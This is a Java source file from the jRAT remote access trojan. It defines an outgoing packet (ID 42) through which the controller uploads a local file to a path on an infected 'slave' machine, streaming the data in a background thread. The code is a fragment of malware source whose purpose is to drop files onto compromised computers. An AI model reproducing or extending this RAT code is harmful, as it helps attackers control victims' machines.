package jrat.module.fs.packets.upload;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;
import jrat.module.fs.ThreadUploadFile;

import java.io.File;

public class Packet42Upload implements OutgoingPacket {

	protected File file;
	protected String remoteFile;
	protected boolean temp;
	protected ThreadUploadFile thread;

	public Packet42Upload(File file, String remoteFile) {
		this(file, remoteFile, false);
	}
	
	public Packet42Upload(File file, String remoteFile, boolean temp) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
		this.thread = new ThreadUploadFile(null, remoteFile, file);
	}
	
	@Override
	public void write(final Slave slave) throws Exception {
		slave.writeBoolean(temp);
		slave.writeLine(remoteFile);
		slave.writeLong(file.length());

		if (file.exists() && file.isFile()) {
			thread.setSlave(slave);
			thread.getData().setObject(slave);
			thread.getData().start();
		}
	}

	@Override
	public short getPacketId() {
		return 42;
	}

}
